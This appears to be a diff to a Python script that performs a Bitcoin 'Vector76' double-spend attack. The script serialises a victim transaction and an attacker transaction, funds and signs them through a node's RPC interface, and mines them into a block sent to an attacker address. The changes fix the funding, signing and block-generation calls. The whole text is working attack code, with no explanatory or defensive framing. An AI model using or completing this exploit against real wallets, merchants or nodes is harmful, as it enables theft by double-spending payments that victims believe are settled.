@@ -77,6 +77,7 @@ print("Connecting Public Node...")
 rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}",
                  service_port=rpc_port)
 print("OK")
+rpc_node.call("importprivkey", key)
 send_amount = to_satoshi(amount_btc)
 inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
 print(inputs)
@@ -92,11 +93,15 @@ tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, key))
 print()
 print()
 tx_vector76 = f"{tx_victim}{tx_attacker}"
+tx_vector76 = rpc_node.fundrawtransaction(tx_vector76)["hex"]
+tx_vector76 = cryptos.serialize(transaction_util.signall(tx_vector76, key))
+
 print(tx_vector76)
+exit()
 print("Mining Vector76 Block...")
 payload = [attacker_address, [tx_vector76], False]
 print(f"Payload : {payload}")
-vector76_respone = rpc_node.call("generateblock", payload)
+vector76_respone = rpc_node.call("generateblock", attacker_address, [tx_vector76], False)
 print(f"Mining Response : {vector76_respone}")
 print()
 #result = rpc_node.sendrawtransaction(f"['{vector76_tx}']")
